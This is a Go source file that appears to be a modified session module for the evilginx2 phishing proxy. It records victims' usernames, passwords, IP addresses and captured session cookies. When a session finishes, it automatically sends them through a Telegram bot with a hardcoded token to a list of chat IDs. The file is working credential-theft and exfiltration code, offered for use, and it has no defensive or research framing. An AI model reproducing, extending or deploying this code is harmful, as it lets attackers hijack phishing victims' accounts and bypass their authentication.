package core

import (
    "encoding/json"
    "fmt"
    "io/ioutil"
    "log"
    "os"
    "time"

    "github.com/go-telegram-bot-api/telegram-bot-api/v5"
    "github.com/kgretzky/evilginx2/database"
)

type Session struct {
    Id             string
    Name           string
    Username       string
    Password       string
    Custom         map[string]string
    Params         map[string]string
    BodyTokens     map[string]string
    HttpTokens     map[string]string
    CookieTokens   map[string]map[string]*database.CookieToken
    RedirectURL    string
    IsDone         bool
    IsAuthUrl      bool
    IsForwarded    bool
    ProgressIndex  int
    RedirectCount  int
    PhishLure      *Lure
    RedirectorName string
    LureDirPath    string
    DoneSignal     chan struct{}
    RemoteAddr     string
    UserAgent      string
}

func NewSession(name string) (*Session, error) {
    s := &Session{
        Id:             GenRandomToken(),
        Name:           name,
        Username:       "",
        Password:       "",
        Custom:         make(map[string]string),
        Params:         make(map[string]string),
        BodyTokens:     make(map[string]string),
        HttpTokens:     make(map[string]string),
        RedirectURL:    "",
        IsDone:         false,
        IsAuthUrl:      false,
        IsForwarded:    false,
        ProgressIndex:  0,
        RedirectCount:  0,
        PhishLure:      nil,
        RedirectorName: "",
        LureDirPath:    "",
        DoneSignal:     make(chan struct{}),
        RemoteAddr:     "",
        UserAgent:      "",
    }
    s.CookieTokens = make(map[string]map[string]*database.CookieToken)

    return s, nil
}

func (s *Session) SetUsername(username string) {
    s.Username = username
}

func (s *Session) SetPassword(password string) {
    s.Password = password
}

func (s *Session) SetCustom(name string, value string) {
    s.Custom[name] = value
}

func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
    if _, ok := s.CookieTokens[domain]; !ok {
        s.CookieTokens[domain] = make(map[string]*database.CookieToken)
    }

    if tk, ok := s.CookieTokens[domain][key]; ok {
        tk.Name = key
        tk.Value = value
        tk.Path = path
        tk.HttpOnly = http_only
    } else {
        s.CookieTokens[domain][key] = &database.CookieToken{
            Name:     key,
            Value:    value,
            HttpOnly: http_only,
        }
    }
}

func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
    tcopy := make(map[string][]CookieAuthToken)
    for k, v := range authTokens {
        tcopy[k] = []CookieAuthToken{}
        for _, at := range v {
            if !at.optional {
                tcopy[k] = append(tcopy[k], *at)
            }
        }
    }

    for domain, tokens := range s.CookieTokens {
        for tk := range tokens {
            if al, ok := tcopy[domain]; ok {
                for an, at := range al {
                    match := false
                    if at.re != nil {
                        match = at.re.MatchString(tk)
                    } else if at.name == tk {
                        match = true
                    }
                    if match {
                        tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
                        if len(tcopy[domain]) == 0 {
                            delete(tcopy, domain)
                        }
                        break
                    }
                }
            }
        }
    }

    if len(tcopy) == 0 {
        return true
    }
    return false
}

func (s *Session) SendToTelegram() error {
    // Load chat IDs from JSON file
    filePath := "/root/ginx/evilginx-telegram-bot-chatids.json"
    file, err := os.Open(filePath)
    if err != nil {
        return fmt.Errorf("failed to open chat ID file: %v", err)
    }
    defer file.Close()

    chatIDs := []int64{}
    byteValue, _ := ioutil.ReadAll(file)
    err = json.Unmarshal(byteValue, &chatIDs)
    if err != nil {
        return fmt.Errorf("failed to unmarshal chat ID file: %v", err)
    }

    // Initialize the bot
    bot, err := tgbotapi.NewBotAPI("7528220716:AAGmwRLAjLgVglKFHq2-1521yb0bDjAqOkI")
    if err != nil {
        return fmt.Errorf("failed to create bot: %v", err)
    }

    messageText := fmt.Sprintf("Username: %s\nPassword: %s\n", s.Username, s.Password)
    messageText += fmt.Sprintf("IP Address: %s\n", s.RemoteAddr)
    messageText += "Cookies:\n"
    for domain, cookies := range s.CookieTokens {
        messageText += fmt.Sprintf("Domain: %s\n", domain)
        for name, cookie := range cookies {
            messageText += fmt.Sprintf("  %s: %s\n", name, cookie.Value)
        }
    }

    // Send the message to each chat ID
    for _, chatID := range chatIDs {
        msg := tgbotapi.NewMessage(chatID, messageText)
        _, err = bot.Send(msg)
        if err != nil {
            log.Printf("failed to send message to chat ID %d: %v", chatID, err)
        }
    }

    return nil
}

func (s *Session) Finish(is_auth_url bool) {
    if !s.IsDone {
        s.IsDone = true
        s.IsAuthUrl = is_auth_url
        if s.DoneSignal != nil {
            close(s.DoneSignal)
            s.DoneSignal = nil
        }

        // Send session information to Telegram
        if err := s.SendToTelegram(); err != nil {
            log.Printf("Error sending session to Telegram: %v", err)
        }
    }
}
